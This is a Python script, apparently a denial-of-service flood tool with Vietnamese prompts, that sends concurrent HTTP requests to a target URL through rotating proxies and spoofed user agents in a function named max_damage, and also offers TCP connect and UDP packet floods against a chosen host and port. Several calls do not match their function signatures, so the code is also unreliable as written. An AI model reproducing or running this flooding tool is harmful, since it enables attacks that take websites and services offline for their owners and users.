import random
import requests
import socket
import struct
import time
from multiprocessing import Pool


def send_http_request(url, headers, body, timeout, proxy):
    try:
        response = requests.request('GET', url, headers=headers, data=body, timeout=timeout, proxies={'http': proxy, 'https': proxy})
        success = True if response.status_code == 200 else False
        return {'success': success, 'statusCode': response.status_code, 'proxy': proxy}
    except:
        return {'success': False, 'statusCode': 0, 'proxy': proxy}


def send_syn_connect(pinghost, pingport, timeout):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout / 1000)
        s.connect((pinghost, int(pingport)))
        return {'success': True}
    except Exception as e:
        return {'success': False}


def send_udp_connect(pinghost, udpport, timeout):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout / 1000)
        packet = struct.pack('BBHHH', 0x00, 0x00, 0x13, 0x37, 0x00)
        s.sendto(packet, (pinghost, int(udpport)))
        return {'success': True}
    except:
        return {'success': False}


def max_damage(url, useragents, proxies, timeout, duration, concurrency):
    with open(useragents, 'r') as f:
        user_agents = f.readlines()
    user_agents = [ua.strip() for ua in user_agents]
    with open(proxies, 'r') as f:
        proxies = f.readlines()
    proxies = [p.strip() for p in proxies]

    time_end = time.time() + duration
    print(f'Đang gửi requests vô tận tới {url} với timeout là {timeout} ms, số lượng request đồng thời là {concurrency}, và đường dẫn đến file useragents là {useragents} và proxies là {proxies}. Thời gian gửi là {duration} giây.')

    current_proxy_index = 0
    successful_requests = 0

    def send_http_request_wrapper(url, headers, body, timeout, proxy):
        return send_http_request(url, headers, body, timeout, proxies[current_proxy_index])

    with Pool(processes=concurrency) as pool:
        while time.time() < time_end:
            headers = {'User-Agent': user_agents[random.randint(0, len(user_agents)-1)]}
            pool.apply_async(send_http_request_wrapper, (url, headers, '', timeout))

        pool.close()
        pool.join()

    print(f'Hoàn thành gửi requests vô tận với {successful_requests} requests thành công.')


def main():
    option = input("Chọn tùy chọn (http/connect/udp): ")

    if option == "http":
        url = input("Địa chỉ URL: ")
        useragents = input("Đường dẫn đến file useragents: ")
        proxies = input("Đường dẫn đến file proxies: ")
        timeout = int(input("Thời gian timeout của request (ms): "))
        duration = int(input("Thời gian gửi request (giây): "))
        concurrency = int(input("Số lượng request đồng thời muốn gửi: "))

        max_damage(url, useragents, proxies, timeout, duration, concurrency)

    elif option == "connect":
        pinghost = input("Địa chỉ IP hoặc tên miền để ping: ")
        pingport = int(input("Cổng để ping: "))
        timeout = int(input("Thời gian timeout của request (ms): "))
        duration = int(input("Thời gian gửi request (giây): "))
        concurrency = int(input("Số lượng request đồng thời muốn gửi: "))

        send_syn_connect(pinghost, pingport, timeout, duration, concurrency)

    elif option == "udp":
        pinghost = input("Địa chỉ IP hoặc tên miền để gửi UDP CONNECT: ")
        udpport = int(input("Cổng để gửi UDP CONNECT: "))
        timeout = int(input("Thời gian timeout của request (ms): "))
        duration = int(input("Thời gian gửi request (giây): "))
        concurrency = int(input("Số lượng request đồng thời muốn gửi: "))

        send_udp_connect(pinghost, udpport, timeout, duration, concurrency)

    else:
        print("Tùy chọn không hợp lệ.")

if __name__ == '__main__':
    main()
